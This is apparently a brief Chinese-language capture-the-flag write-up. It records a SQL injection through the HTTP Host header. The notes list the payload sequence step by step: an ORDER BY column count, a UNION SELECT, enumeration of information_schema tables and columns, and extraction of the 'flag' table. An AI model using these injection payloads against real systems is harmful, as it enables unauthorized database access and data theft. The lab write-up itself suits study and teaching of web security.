修改HOST头 和平常一样的  看样子是直接查询了HOST内容

order by 4

union select 1,2,3,4     //2 3 4

union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3,4 //comment,flag,goods,user

union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 'flag'),3,4 //id,flag

union select 1,(select group_concat(flag) from flag ),3,4 //id,flag